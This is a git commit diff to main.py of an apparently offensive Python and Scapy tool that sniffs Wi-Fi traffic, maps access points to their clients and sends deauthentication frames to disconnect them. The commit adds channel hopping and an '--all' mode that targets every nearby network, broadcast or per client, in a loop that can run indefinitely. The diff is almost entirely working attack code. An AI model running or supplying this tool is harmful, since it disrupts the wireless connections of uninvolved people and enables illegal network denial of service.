7202572698b45fdc3aa46669bde3cb8e1a184f8c
Gill-Singh-A <amansg22@iitk.ac.in>
2024-06-22 00:32:21 +0530

    Implemented to Sniff Network Packets, extract Details of APs and Clients and Deauthenticate the Clients from their APs

--- main.py
+++ main.py
@@ -5,7 +5,7 @@ from scapy.all import *
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
-from time import strftime, localtime
+from time import strftime, localtime, sleep
 from threading import Thread, Lock
 from multiprocessing import Pool, cpu_count
 
@@ -19,12 +19,12 @@ status_color = {
 
 deauth_frame_set_count = 10
 send_interval_delay = 0.1
-all_access_points = set()
 access_points = {}
-associations = {}
+associations = []
 packet_sent_loops = 10
 broadcast_mac = "ff:ff:ff:ff:ff:ff"
 started_sniffing = False
+channel_hopping_delay = 0.5
 
 lock = Lock()
 thread_count = cpu_count()
@@ -43,42 +43,41 @@ def check_root():
 
 def process_packet(packet):
     if packet.haslayer(Dot11Beacon):
-        bssid = packet[Dot11].addr2.upper()
+        bssid = packet[Dot11].addr2
         network_stats = packet[Dot11Beacon].network_stats()
         channel = network_stats["channel"]
         with lock:
             access_points[bssid] = {"channel" : channel}
-            all_access_points.add(bssid)
     elif packet.haslayer(Dot11ProbeResp):
         try:
-            bssid = packet[Dot11].addr2.upper()
+            bssid = packet[Dot11].addr2
         except:
-            bssid = "FF:FF:FF:FF:FF:FF"
+            bssid = broadcast_mac
         try:
-            recv_addr = packet[Dot11].addr1.upper()
+            recv_addr = packet[Dot11].addr1
         except:
-            recv_addr = "FF:FF:FF:FF:FF:FF"
+            recv_addr = broadcast_mac
         with lock:
-            if bssid.lower() != broadcast_mac:
-                all_access_points.add(bssid)
-            if recv_addr.lower() != broadcast_mac and bssid.lower() != broadcast_mac:
-                associations[bssid] = recv_addr
-                associations[recv_addr] = bssid
+            if recv_addr != broadcast_mac and bssid != broadcast_mac and type(recv_addr) == str and type(bssid) == str:
+                if [bssid, recv_addr] not in associations:
+                    associations.append([bssid, recv_addr])
+                if [recv_addr, bssid] not in associations:
+                    associations.append([recv_addr, bssid])
     elif packet.haslayer(Dot11):
         try:
-            bssid = packet[Dot11].addr2.upper()
+            bssid = packet[Dot11].addr2
         except:
-            bssid = "FF:FF:FF:FF:FF:FF"
+            bssid = broadcast_mac
         try:
-            recv_addr = packet[Dot11].addr1.upper()
+            recv_addr = packet[Dot11].addr1
         except:
-            recv_addr = "FF:FF:FF:FF:FF:FF"
+            recv_addr = broadcast_mac
         with lock:
-            if bssid.lower() != broadcast_mac:
-                all_access_points.add(bssid)
-            if recv_addr.lower() != broadcast_mac and bssid.lower() != broadcast_mac:
-                associations[bssid] = recv_addr
-                associations[recv_addr] = bssid
+            if recv_addr != broadcast_mac and bssid != broadcast_mac and type(recv_addr) == str and type(bssid) == str:
+                if [bssid, recv_addr] not in associations:
+                    associations.append([bssid, recv_addr])
+                if [recv_addr, bssid] not in associations:
+                    associations.append([recv_addr, bssid])
 def changeChannel(interface, channel):
     system(f"iwconfig {interface} channel {channel}")
 def sendDeauthenticationFrame(ssid, client, iface, count, interval):
@@ -91,18 +90,24 @@ def sendDeauthenticationFrameHandler(divisions, interface, count, delay):
         ap_bssid = division[0]
         client = division[1]
         sendDeauthenticationFrame(ap_bssid, client, interface, count, delay)
+def hop_channels(interface, delay, loops=1):
+    channels = list(range(1, 15))
+    for _ in range(loops):
+        for channel in channels:
+            system(f"iwconfig {interface} channel {channel}")
+            sleep(delay)
 
 if __name__ == "__main__":
     arguments = get_arguments(('-i', "--interface", "interface", "Network Interface to Start Sniffing on"),
-                              ('-A', "--all", "all", "Deauth All Clients nearby (Broadcast/Individual, Default=Individual)"),
+                              ('-A', "--all", "all", "Deauth All Clients nearby (broadcast/individual)"),
                               ('-s', "--ssid", "ssid", "SSID for Access Point"),
                               ('-c', "--client", "client", "SSIDs for Clients (Seperated by ',')"),
                               ('-L', "--load", "load", "Load SSIDs for Access Points and their Clients from File (AP SSID,Client SSID,Channel)"),
                               ('-C', "--channel", "channel", "Channel to send Deauthentication Frames to (Would help if TBTT (Target Beacon Transmit Time) is large)"),
                               ('-f', "--count", "count", f"Count of Deauthentication frames to send in each set (Default={deauth_frame_set_count})"),
                               ('-d', "--delay", "delay", f"Delay Between Channel Hopping (Default={send_interval_delay} seconds)"),
-                              ('-l', "--loop", "loop", f"Number of Times to Loop the sending of Deauthentication Frames (0 if Indefinitely, Default={packet_sent_loops})"),
-                              ('-w', "--write", "write", "Dump Packets to a File"))
+                              ('-D', "--hopping-delay", "hopping_delay", f"Channel Hopping Delay (Default={channel_hopping_delay} seconds)"),
+                              ('-l', "--loop", "loop", f"Number of Times to Loop the sending of Deauthentication Frames (0 if Indefinitely, Default={packet_sent_loops})"))
     if not check_root():
         display('-', f"This Program requires {Back.YELLOW}root{Back.RESET} Privileges")
         exit(0)
@@ -119,6 +124,10 @@ if __name__ == "__main__":
         arguments.delay = float(arguments.delay)
     else:
         arguments.delay = send_interval_delay
+    if arguments.hopping_delay:
+        arguments.hopping_delay = float(arguments.hopping_delay)
+    else:
+        arguments.hopping_delay = channel_hopping_delay
     if arguments.loop:
         arguments.loop = int(arguments.loop)
     else:
@@ -163,8 +172,8 @@ if __name__ == "__main__":
     else:
         Thread(target=sniff, kwargs={"iface": arguments.interface, "prn": process_packet}, daemon=True).start()
         started_sniffing = True
+    channel_wise_divisions = {}
     if not arguments.all:
-        channel_wise_divisions = {}
         print(f"{Fore.CYAN}AP BSSID         \tCLIENT BSSID         \tCHANNEL{Fore.RESET}")
         for channel, details in deauth_details.items():
             total_essid_pairs = []
@@ -174,10 +183,46 @@ if __name__ == "__main__":
             total_pairs = len(total_essid_pairs)
             current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
             channel_wise_divisions[channel] = current_division
-        loop_count = 0
+    else:
+        display(':', f"Hopping Channels...")
+        hop_channels(arguments.interface, arguments.hopping_delay, 2)
+    loop_count = 0
     while True:
+        if arguments.all:
+            hop_channels(arguments.interface, arguments.hopping_delay)
+            deauth_details = {}
+            with lock:
+                if arguments.all == "broadcast":
+                    for ap_ssid, channel in access_points.items():
+                        if channel["channel"] not in deauth_details.items():
+                            deauth_details[channel["channel"]] = {}
+                        deauth_details[channel["channel"]][ap_ssid] = [broadcast_mac]
+                    for channel, details in deauth_details.items():
+                        total_essid_pairs = []
+                        for ap_bssid, clients in details.items():
+                            total_essid_pairs.extend([[ap_bssid, client] for client in clients])
+                        total_pairs = len(total_essid_pairs)
+                        current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
+                        channel_wise_divisions[channel] = current_division
+                else:
+                    for ap_ssid, channel in access_points.items():
+                        if channel["channel"] not in deauth_details.items():
+                            deauth_details[channel["channel"]] = {}
+                        deauth_details[channel["channel"]][ap_ssid] = []
+                        for station_1, station_2 in associations:
+                            if station_2 == ap_ssid:
+                                deauth_details[channel["channel"]][ap_ssid].append(station_1)
+                            elif station_1 == ap_ssid:
+                                deauth_details[channel["channel"]][ap_ssid].append(station_2)
+                    for channel, details in deauth_details.items():
+                        total_essid_pairs = []
+                        for ap_bssid, clients in details.items():
+                            total_essid_pairs.extend([[ap_bssid, client] for client in clients])
+                        total_pairs = len(total_essid_pairs)
+                        current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
+                        channel_wise_divisions[channel] = current_division
         for channel, channel_wise_division in channel_wise_divisions.items():
-            display('+', f"Changing Channel of {Back.MAGENTA}{arguments.interface}{Back.RESET} to {Back.MAGENTA}{arguments.channel}{Back.RESET}")
+            display('+', f"Changing Channel of {Back.MAGENTA}{arguments.interface}{Back.RESET} to {Back.MAGENTA}{channel}{Back.RESET}")
             changeChannel(arguments.interface, channel)
             pool = Pool(thread_count)
             threads = []
